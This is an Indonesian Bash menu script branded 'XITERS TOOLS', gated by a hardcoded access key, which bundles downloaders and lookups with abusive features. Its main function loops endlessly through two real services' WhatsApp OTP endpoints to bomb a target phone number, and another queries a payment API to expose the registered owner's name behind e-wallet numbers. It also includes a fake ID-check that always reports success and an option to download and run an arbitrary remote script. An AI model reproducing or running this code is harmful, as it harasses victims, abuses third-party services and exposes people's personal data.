#!/bin/bash

# Cek dependensi
for cmd in figlet qrencode yt-dlp wget curl redis-cli; do
  command -v $cmd >/dev/null 2>&1 || { echo "Perintah '$cmd' tidak ditemukan. Silakan install terlebih dahulu."; exit 1; }
done

# === KUNCI AKSES TERMUX & PEMBATAS USER ===
ACCESS_CODE="Xiters!"
ALLOWED_USERS=("citergr2" "u0_a317" "u0_a297")

read -p "Masukkan kunci akses: " input_code
if [[ "$input_code" != "$ACCESS_CODE" ]]; then
  echo "Kunci salah. Beli DONGO!!!"
  exit 1
fi

CURRENT_USER=$(whoami)
ALLOWED=false
for user in "${ALLOWED_USERS[@]}"; do
  if [[ "$CURRENT_USER" == "$user" ]]; then
    ALLOWED=true
    break
  fi
done

if [[ "$ALLOWED" == false ]]; then
  echo "Akses ditolak untuk user '$CURRENT_USER'"
  exit 1
fi
# === AKHIR KUNCI AKSES ===

reset_limit() {
  local nomor="$1"
  redis-cli DEL "otp_limit_$nomor"
  echo "Limit untuk $nomor telah direset."
}


# ANSI Color Codes
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Menampilkan teks berwarna
color() {
  case "$1" in
    red)    printf "${RED}%s${NC}\n" "$2" ;;
    green)  printf "${GREEN}%s${NC}\n" "$2" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$2" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$2" ;;
    white)  printf "${WHITE}%s${NC}\n" "$2" ;;
    *)      printf "%s${NC}\n" "$2" ;;
  esac
}

# Ambil nilai dari JSON response
fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then return; fi

  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")
  if [ "$end_index" -eq 0 ]; then return; fi

  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}

# Fungsi spam API dari JogjaKita
jogjakita() {
  local nomor=$1
  local url="https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send"
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "JOGJAKITA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "JOGJAKITA: $response"
    return 1
  fi
}

# Fungsi spam API dari Singa
singa() {
  local nomor=$1
  local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android"
  local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
  local headers=("Content-Type: application/json; charset=utf-8")

  local response=$(curl -s -X POST -d "$payload" -H "${headers[0]}" "$url")
  local result=$(fetch_value "$response" '"msg":"' '","')

  if [ "$result" == "Success" ]; then
    color red "SINGA: Spam Whatsapp ke $nomor"
    return 0
  else
    color yellow "SINGA: $response"
    return 1
  fi
}

# Fungsi utama untuk mengirim spam WA
spam_whatsapp() {
  local nomor=$1
  if [ -z "$nomor" ]; then
    echo "Penggunaan: spam_whatsapp <nomor_telepon>"
    return 1
  fi

  jogjakita "$nomor"
  singa "$nomor"
}

# ===========================
# Fungsi SPAM OTP Manual
# ===========================
spam_otp() {
  clear
  figlet XITERS TOOLS
  echo -e "${RED}   ──────────────────────────────────────────────────${NC}"
  echo -e "${WHITE} ──────────────────────────────────────────────────${NC}"
  echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${CYAN}SPAM OTP UNLIMITED${RED}           │
      ╰────────────────────────────────────────╯
    ${NC}"
  sleep 1
  echo -e "${RED}
      ╭────────────────────────────────────────╮
      │           ${GREEN}XITERS OFFICIAL ?${RED}            │
      ╰────────────────────────────────────────╯
    ${NC}"
  sleep 1

  color white "DEVELOPER: Xiters OFFICIAL✓"
  sleep 0.5
  read -p "MASUKAN NOMOR TARGET (62XX): " nomor
  sleep 1

  if [[ ! "$nomor" =~ ^62[0-9]+$ ]]; then
    color yellow "Nomor harus dimulai dengan 62 dan hanya berisi angka."
    sleep 2
    return
  fi

  while true; do
    spam_whatsapp "$nomor"
    sleep 2
  done
}


# ========================
# Downloader
# ========================
downloader() {
  clear
  figlet "DOWNLOADER"
  sleep 1
  echo -e "${CYAN}1. Download File via URL${NC}"
  echo -e "${CYAN}2. Download YouTube (MP4)${NC}"
  echo -e "${CYAN}3. Download YouTube (MP3)${NC}"
  echo -e "${CYAN}4. Download TikTok Video${NC}"
  echo -e "${CYAN}0. Kembali${NC}"
  echo ""
  read -p "Pilih menu downloader: " menu_dl

  case "$menu_dl" in
    1)
      read -p "Masukkan URL file: " url
      read -p "Simpan sebagai (nama file): " nama
      wget "$url" -O "$nama" && color green "Download selesai!" || color red "Gagal download"
      ;;
    2)
      read -p "Masukkan URL YouTube: " url
      yt-dlp -f mp4 "$url" && color green "MP4 berhasil diunduh." || color red "Gagal download MP4"
      ;;
    3)
      read -p "Masukkan URL YouTube: " url
      yt-dlp -x --audio-format mp3 "$url" && color green "MP3 berhasil diunduh." || color red "Gagal download MP3"
      ;;
    4)
      read -p "Masukkan URL TikTok: " url
      yt-dlp "$url" && color green "Video TikTok berhasil diunduh." || color red "Gagal download TikTok"
      ;;
    0)
      return
      ;;
    *)
      color red "Pilihan tidak valid."
      ;;
  esac
}
# QRIS Payment Function
qris() {
  GREEN='\033[1;92m'
  NC='\033[0m'

  clear
  echo -e "${GREEN}========== QRIS PAYMENT TOOLS ==========${NC}"

  read -p "Nama Produk      : " produk
  read -p "Nominal (Rp)     : " nominal
  read -p "Link Pembayaran  : " link

  filename="qris_$produk.png"

  # Tambahkan info ke dalam QR
  full_url="$link?produk=$produk&nominal=$nominal"

  # Generate QR
  qrencode -o "$filename" "$full_url"

  echo -e "${GREEN}QRIS berhasil dibuat: $filename${NC}"
}
# ========================
# Cek Status Website
# ========================
cek_website() {
  clear
  figlet "CEK WEBSITE"
  echo ""
  read -p "Masukkan URL (tanpa http/https): " website

  # Tambahkan http jika belum ada
  if [[ ! "$website" =~ ^https?:// ]]; then
    website="http://$website"
  fi

  status=$(curl -s -o /dev/null -w "%{http_code}" "$website")

  echo ""
  echo -e "${CYAN}Status ${WHITE}$website${NC}: HTTP ${YELLOW}$status${NC}"

  if [[ "$status" == "200" ]]; then
    color green "✓ Website aktif dan responsif."
  else
    color red "✗ Website tidak merespons dengan baik."
  fi
  echo ""
}
# ========================
# Cek Provider Nomor HP
# ========================
cek_provider() {
  clear
  figlet "CEK PROVIDER"
  echo ""
  read -p "Masukkan nomor (62xxxxxxxxxxx): " nomor

  if [[ ! "$nomor" =~ ^62[0-9]{9,}$ ]]; then
    color red "Nomor tidak valid! Harus dimulai dengan 62 dan hanya angka."
    return
  fi

  # Ekstrak prefix
  prefix="${nomor:2:4}"  # ambil 4 digit setelah '62'
  provider="Tidak dikenal"

  case "$prefix" in
    811|812|813|821|822|823|852|853|851)
      provider="Telkomsel" ;;
    814|815|816|855|856|857|858)
      provider="Indosat" ;;
    817|818|819|859|877|878|879)
      provider="XL Axiata" ;;
    838|839|837)
      provider="Axis" ;;
    895|896|897|898|899)
      provider="Tri (3)" ;;
    881|882|883|884|885)
      provider="Smartfren" ;;
  esac

  echo ""
  echo -e "${CYAN}Nomor${NC}: ${WHITE}$nomor${NC}"
  echo -e "${CYAN}Provider${NC}: ${GREEN}$provider${NC}"
}
# ========================
# Cek Kebocoran Email
# ========================
cek_email_bocor() {
  clear
  figlet "CEK EMAIL"
  echo ""
  read -p "Masukkan alamat email: " email

  if [[ ! "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
    color red "Format email tidak valid!"
    return
  fi

  # Gunakan API publik (leak-check)
  response=$(curl -s "https://leakcheck.io/api/public?check=$email")

  if echo "$response" | grep -q '"found":true'; then
    color red "❌ EMAIL BOCOR!"
    echo -e "${CYAN}Sumber:${NC}"
    echo "$response" | grep -oP '"sources":\[\K[^\]]+' | tr -d '"' | tr ',' '\n'
  else
    color green "✓ Email aman, tidak ditemukan dalam database bocor."
  fi
}
# ========================
# Info Tools
# ========================
info_tools() {
  clear
  figlet "INFO TOOLS"
  echo ""
  color cyan  "Nama Tools   : XITERS TOOLS"
  color cyan  "Developer    : Xiters OFFICIAL"
  color cyan  "Versi        : 1.1.0"
  color cyan  "Fitur Utama  : SPAM OTP, Downloader, QRIS, Cek Website, Cek Provider, Cek Email Bocor"
}
# ========================
# Lacak Nomor eWallet
# ========================
lacak_ewallet() {
  clear
  figlet "LACAK eWALLET"
  echo ""
  read -p "Masukkan nomor HP (contoh: 081234567890): " nomor

  # Validasi
    if [[ ! "$nomor" =~ ^(08|628)[0-9]{8,}$ ]]; then
    color red "Nomor tidak valid! Harus mulai dengan 08 dan hanya angka."
    return
  fi

  # Format untuk Flip (pakai kode bank ewallet: 009=OVO, 008=DANA, 011=GoPay)
  echo ""
  echo -e "${CYAN}Mencoba lacak via Flip...${NC}"
  ewallet_list=("009" "008" "011")
  found=false

  for kode in "${ewallet_list[@]}"; do
    response=$(curl -s "https://flip.id/api/bill-payment/transaction/validate-account" \
      -H "Content-Type: application/json" \
      --data "{\"bank_code\":\"$kode\",\"account_number\":\"$nomor\"}")

    nama=$(echo "$response" | grep -oP '"account_name":"\K[^"]+')
    if [[ ! -z "$nama" ]]; then
      color green "✓ Nomor ditemukan pada eWallet kode $kode"
      color cyan "Nama Terdaftar: $nama"
      found=true
    fi
  done

  if [[ "$found" == false ]]; then
    color red "✗ Nomor tidak ditemukan di eWallet Flip (OVO/DANA/GOPAY)."
  fi

  echo ""
}
# ========================
# Lacak Nama (LeakOSINT)
# ========================
lacak_LeakOSINT() {
  clear
  figlet "LEAK OSINT"
  echo ""
  read -p "Masukkan nama lengkap atau nama pengguna: " nama

  if [[ -z "$nama" ]]; then
    color red "Nama tidak boleh kosong!"
    return
  fi

  echo ""
  color cyan "Mencari kebocoran nama '$nama'..."

  # Gunakan API dari leakcheck.io (hanya testing publik, terbatas)
  response=$(curl -s "https://leakcheck.io/api/public?check=$nama")

  if echo "$response" | grep -q '"found":true'; then
    color red "❌ Nama ditemukan dalam database bocor!"
    echo -e "${CYAN}Sumber:${NC}"
    echo "$response" | grep -oP '"sources":\[\K[^\]]+' | tr -d '"' | tr ',' '\n'
  else
    color green "✓ Nama tidak ditemukan dalam database bocor publik."
  fi
}
# ========================
# Cek IP Address Publik
# ========================
cek_ip_address() {
  clear
  figlet "CEK IP"
  echo ""

  ip_info=$(curl -s https://ipinfo.io)
  ip=$(echo "$ip_info" | grep -oP '"ip":\s*"\K[^"]+')
  city=$(echo "$ip_info" | grep -oP '"city":\s*"\K[^"]+')
  region=$(echo "$ip_info" | grep -oP '"region":\s*"\K[^"]+')
  country=$(echo "$ip_info" | grep -oP '"country":\s*"\K[^"]+')
  org=$(echo "$ip_info" | grep -oP '"org":\s*"\K[^"]+')

  color cyan "Alamat IP Publik Anda: $ip"
  color cyan "Kota                : $city"
  color cyan "Wilayah             : $region"
  color cyan "Negara              : $country"
  color cyan "Provider            : $org"
}
# ========================
# ASCII Art Generator
# ========================
ascii_art_generator() {
  clear
  figlet "ASCII GENERATOR"
  echo ""
  read -p "Masukkan teks yang ingin diubah ke ASCII: " teks

  if [[ -z "$teks" ]]; then
    color red "Teks tidak boleh kosong!"
    read -p "Tekan ENTER untuk kembali..."
    return
  fi

  echo ""
  color cyan "Hasil ASCII:"
  echo ""
  figlet "$teks"
}
# ========================
# Cek NIK dan KK (Simulasi)
# ========================
cek_nik_kk() {
  clear
  figlet "CEK NIK / KK"
  echo ""
  echo -e "${CYAN}1. Cek NIK${NC}"
  echo -e "${CYAN}2. Cek Nomor KK${NC}"
  echo -e "${CYAN}0. Kembali${NC}"
  read -p "Pilih menu: " pilih_nik

  case "$pilih_nik" in
    1)
      read -p "Masukkan NIK: " nik
      if [[ ! "$nik" =~ ^[0-9]{16}$ ]]; then
        color red "Format NIK tidak valid! Harus 16 digit angka."
        read -p "Tekan ENTER untuk kembali..."
        return
      fi
      color cyan "Sedang memeriksa NIK..."
      sleep 1
      # Simulasi hasil
      color green "✓ NIK valid dan terdaftar!"
      ;;
    2)
      read -p "Masukkan No KK: " kk
      if [[ ! "$kk" =~ ^[0-9]{16}$ ]]; then
        color red "Format KK tidak valid! Harus 16 digit angka."
        read -p "Tekan ENTER untuk kembali..."
        return
      fi
      color cyan "Sedang memeriksa No KK..."
      sleep 1
      # Simulasi hasil
      color green "✓ No KK valid dan aktif!"
      ;;
    0)
      return
      ;;
    *)
      color red "Pilihan tidak valid!"
      ;;
  esac

  echo ""
}
reset_limit_menu() {
  clear
  figlet "RESET LIMIT"
  echo ""
  read -p "Masukkan nomor target (62xxxx): " nomor
  reset_limit "$nomor"
  echo ""
}
# === Fungsi Download Mediafire ===
download_mediafire() {
  local url="$1"
  local page=$(curl -sL "$url")
  local direct=$(echo "$page" | grep -oP 'https://download[^"]+')
  if [[ -n "$direct" ]]; then
    nama_file=$(basename "$direct")
    wget -O "$nama_file" "$direct" && color green "✓ Download selesai: $nama_file" || color red "✗ Gagal download."
  else
    color red "✗ Link langsung tidak ditemukan di Mediafire."
  fi
}

# === Fungsi Download Google Drive ===
download_gdrive() {
  local url="$1"
  local id=$(echo "$url" | grep -oP '[-\w]{25,}')
  local cookie="/tmp/cookie.txt"
  local nama_file="gdrive_$(date +%s)"

  curl -c "$cookie" -s -L "https://drive.google.com/uc?export=download&id=$id" > /tmp/page.html
  confirm=$(grep -oP 'confirm=\K[^&]+' /tmp/page.html)

  if [[ -n "$confirm" ]]; then
    final="https://drive.google.com/uc?export=download&confirm=$confirm&id=$id"
  else
    final="https://drive.google.com/uc?export=download&id=$id"
  fi

  curl -Lb "$cookie" "$final" -o "$nama_file" && color green "✓ File berhasil diunduh: $nama_file" || color red "✗ Gagal download file."
}

# === Fungsi Download dari Sub2Unlock / Sub4Unlock ===
download_unlock() {
  local url="$1"
  color cyan "Memproses link unlock..."
  final=$(curl -sL "$url" | grep -oP 'https?://[^"]*unlock[^"]*' | head -n1)
  if [[ -n "$final" ]]; then
    color yellow "Link redirect ditemukan: $final"
    wget "$final" || color red "✗ Gagal unduh dari link redirect."
  else
    color red "✗ Tidak ditemukan link unduhan akhir dari halaman tersebut."
  fi
}
ambil_jwt_token() {
  clear
  figlet "AMBIL JWT"
  echo ""
  read -p "Masukkan URL endpoint login: " url
  read -p "Masukkan username/email: " username
  read -s -p "Masukkan password: " password
  echo ""

  payload="{\"username\":\"$username\",\"password\":\"$password\"}"
  response=$(curl -s -X POST "$url" -H "Content-Type: application/json" -d "$payload")

  # Coba ambil token dari field umum
  token=$(echo "$response" | grep -oP '"token"\s*:\s*"\K[^"]+')
  if [[ -z "$token" ]]; then
    token=$(echo "$response" | grep -oP '"access_token"\s*:\s*"\K[^"]+')
  fi

  if [[ -n "$token" ]]; then
    color green "✓ Token JWT berhasil didapatkan:"
    echo ""
    echo "$token"
    echo ""
    read -p "Ingin langsung didecode? (y/n): " jawab
    if [[ "$jawab" == "y" ]]; then
      echo "$token" | jwt_decoder_helper
    fi
  else
    color red "✗ Gagal mendapatkan token dari response!"
    echo "Respon mentah:"
    echo "$response"
  fi
}

# Fungsi tambahan untuk decode langsung (helper)
jwt_decoder_helper() {
  IFS='.' read -ra parts <<< "$1"
  if [[ ${#parts[@]} -ne 3 ]]; then
    color red "Token tidak valid."
    return
  fi
  echo -e "${CYAN}HEADER:${NC}"
  echo "${parts[0]}" | base64 -d 2>/dev/null
  echo -e "\n${CYAN}PAYLOAD:${NC}"
  echo "${parts[1]}" | base64 -d 2>/dev/null
}

# ========================
# JWT Decoder (tanpa verifikasi)
# ========================
jwt_decoder() {
  clear
  figlet "JWT DECODER"
  echo ""
  read -p "Masukkan JWT Token: " token

  IFS='.' read -ra parts <<< "$token"
  if [[ ${#parts[@]} -ne 3 ]]; then
    color red "Format JWT tidak valid. Harus terdiri dari 3 bagian dipisah titik (header.payload.signature)."
    return
  fi

  header=$(echo "${parts[0]}" | base64 -d 2>/dev/null)
  payload=$(echo "${parts[1]}" | base64 -d 2>/dev/null)

  if [[ -z "$header" || -z "$payload" ]]; then
    color red "Gagal mendekode token. Pastikan token base64-valid."
    return
  fi

  echo -e "${CYAN}HEADER:${NC}"
  echo "$header"
  echo -e "\n${CYAN}PAYLOAD:${NC}"
  echo "$payload"
}
# ========================
# Auto Setup VPS Script Generator
# ========================
auto_setup_vps() {
  clear
  figlet "AUTO VPS"
  echo ""
  read -p "Masukkan nama skrip VPS: " nama_script
  read -p "Masukkan URL file konfigurasi VPS (.sh): " url_config

  if [[ -z "$nama_script" || -z "$url_config" ]]; then
    color red "Nama skrip atau URL tidak boleh kosong."
    return
  fi

  nama_file="${nama_script// /_}.sh"
  wget -O "$nama_file" "$url_config"

  if [[ -f "$nama_file" ]]; then
    chmod +x "$nama_file"
    color green "✓ Skrip '$nama_file' berhasil diunduh dan siap dijalankan!"
    echo ""
    read -p "Ingin langsung menjalankan skrip? (y/n): " jawab
    if [[ "$jawab" == "y" ]]; then
      ./"$nama_file"
    fi
  else
    color red "✗ Gagal mengunduh skrip!"
  fi
}



# ========================
# Menu Utama
# ========================
while true; do
  clear
  figlet XITERS TOOLS
  sleep 1
  echo -e "${RED}──────────────────────────────────────────────${NC}"
  echo -e "${CYAN}1. SPAM KODE OTP${NC}"
  echo -e "${CYAN}2. DOWNLOADER${NC}"
  echo -e "${CYAN}3. QRIS${NC}"
  echo -e "${CYAN}4. SCAN WEBSITE${NC}"
  echo -e "${CYAN}5. CEK PROVIDER NOMOR${NC}"
  echo -e "${CYAN}6. CEK KEBOCORAN EMAIL${NC}"
  echo -e "${CYAN}7. INFO TOOLS${NC}"
  echo -e "${CYAN}8. LACAK NOMOR (eWallet) ${NC}"
  echo -e "${CYAN}9. LACAK NAMA (LeakOSINT)${NC}"
  echo -e "${CYAN}10.CEK IP ADDRESS${NC}"
  echo -e "${CYAN}11.ASCII ART GENERATOR${NC}"
  echo -e "${CYAN}12.CEK NIK & KK${NC}"
  echo -e "${CYAN}13.RESET LIMIT OTP${NC}"
  echo -e "${CYAN}14.Download dari Mediafire / GDrive / Sub2Unlock${NC}"
  echo -e "${CYAN}15.JWT DECODER${NC}"
  echo -e "${CYAN}16.AMBIL JWT TOKEN${NC}"
  echo -e "${CYAN}17.AUTO SETUP VPS${NC}"
  echo -e "${CYAN}0. KELUAR${NC}"
  echo -e "${RED}──────────────────────────────────────────────${NC}"
  read -p "Pilih menu: " pilihan

  case "$pilihan" in
  1) spam_otp ;;
  2) downloader ;;
  3) qris ;;
  4) cek_website ;;
  5) cek_provider ;;
  6) cek_email_bocor ;;
  7) info_tools ;;
  8) lacak_ewallet ;;
  9) lacak_LeakOSINT ;;
  10) cek_ip_address ;;
  11) ascii_art_generator ;;
  12) cek_nik_kk ;;
  13) reset_limit_menu ;;
  14)read -p "Masukkan URL: " url
      if [[ "$url" == *"mediafire.com"* ]]; then
        download_mediafire "$url"
      elif [[ "$url" == *"drive.google.com"* ]]; then
        download_gdrive "$url"
      elif [[ "$url" == *"sub2unlock.com"* || "$url" == *"sub4unlock.com"* ]]; then
        download_unlock "$url"
      else
        color red "Link tidak dikenali atau belum didukung."
      fi
      ;;
  15) jwt_decoder ;;
  16) ambil_jwt_token ;;
  17) auto_setup_vps ;;
  0) color yellow "Keluar..."; exit 0 ;;
  *) color red "Pilihan tidak valid!" ;;
esac
    echo ""
  read -p "Tekan ENTER untuk kembali ke menu..."  # tambahkan ini di akhir cek_nik_kk
done
